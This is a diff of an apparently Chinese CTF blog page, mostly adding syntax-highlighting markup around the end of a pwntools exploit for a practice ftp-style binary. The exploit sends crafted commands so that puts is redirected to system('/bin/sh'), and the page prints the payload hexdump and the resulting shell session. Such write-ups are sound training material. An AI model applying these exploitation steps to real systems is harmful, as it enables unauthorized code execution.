+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#调用get函数利用漏洞</span>
+sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin'</span><span class="token punctuation">)</span>  
+<span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-sh.sendline(&#39;dir&#39;)   #调用dir函数，此时s是/bin/sh 可通过调试得出
-#sh.recv()            最后将跳转puts函数参数为/bin/sh但执行system函数，得到shell
-sh.interactive()</code></pre><p>结果：</p>
-<pre><code>    000000d0  20 20 20 20  00 20 20 20  20 20 20 20  20 20 20 20  │    │·   │    │    │
-    000000e0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
-    000000f0  20 20 20 20  20 20 00 61  61 61 28 a0  04 08 29 a0  │    │  ·a│aa(·│··)·│
-    00000100  04 08 2a a0  04 08 2b a0  04 08 66 74  70 3e        │··*·│··+·│··ft│p&gt;│
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#调用dir函数，此时s是/bin/sh 可通过调试得出</span>
+<span class="token comment" spellcheck="true">#sh.recv()            最后将跳转puts函数参数为/bin/sh但执行system函数，得到shell</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>结果：</p>
+<pre class=" language-c"><code class="language-c">    000000d0  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">00</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  │    │·   │    │    │
+    <span class="token number">000000e0</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  │    │    │    │    │
+    000000f0  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">00</span> <span class="token number">61</span>  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">28</span> a0  <span class="token number">04</span> <span class="token number">08</span> <span class="token number">29</span> a0  │    │  ·a│<span class="token function">aa</span><span class="token punctuation">(</span>·│··<span class="token punctuation">)</span>·│
+    <span class="token number">00000100</span>  <span class="token number">04</span> <span class="token number">08</span> 2a a0  <span class="token number">04</span> <span class="token number">08</span> 2b a0  <span class="token number">04</span> <span class="token number">08</span> <span class="token number">66</span> <span class="token number">74</span>  <span class="token number">70</span> 3e        │··<span class="token operator">*</span>·│··<span class="token operator">+</span>·│··ft│p<span class="token operator">></span>│
     0000010e
-               \x98            \x04                                                                                                                                                                                      \x00                                \x00aa(\xa0\x04)\xa0\x04*\xa0\x04+\xa0\x04ftp&gt;
-[DEBUG] Sent 0x4 bytes:
-    &#39;dir\n&#39;
-[*] Switching to interactive mode
+               \x98            \x04                                                                                                                                                                                      \x00                                \<span class="token function">x00aa</span><span class="token punctuation">(</span>\xa0\x04<span class="token punctuation">)</span>\xa0\x04<span class="token operator">*</span>\xa0\x04<span class="token operator">+</span>\xa0\x04ftp<span class="token operator">></span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x4</span> bytes<span class="token punctuation">:</span>
+    <span class="token string">'dir\n'</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode
 $ whoami
-[DEBUG] Sent 0x7 bytes:
-    &#39;whoami\n&#39;
-[DEBUG] Received 0x7 bytes:
-    &#39;hunter\n&#39;
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>
+    <span class="token string">'whoami\n'</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>
+    <span class="token string">'hunter\n'</span>
 hunter
 $  </code></pre>
+
             </div>
             <hr/>
 
@@ -836,7 +847,8 @@ $  </code></pre>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary">1：checksechunter@hunter:~/PWN/XCTF/xctf_challenge$ checksec forgot
-[*] &#39;/home/hunter/PWN/XCTF/xctf_challenge/forgot&</div>
+[*] '/home/hunter/PWN/XCTF/xctf_challenge/forgot'
+   </div>
                     <div class="publish-info">
                             <span class="publish-date">
                                 <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-16
@@ -964,7 +976,7 @@ $  </code></pre>
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">31.5k</span>
+                <span class="white-color">30k</span>
             
 
             
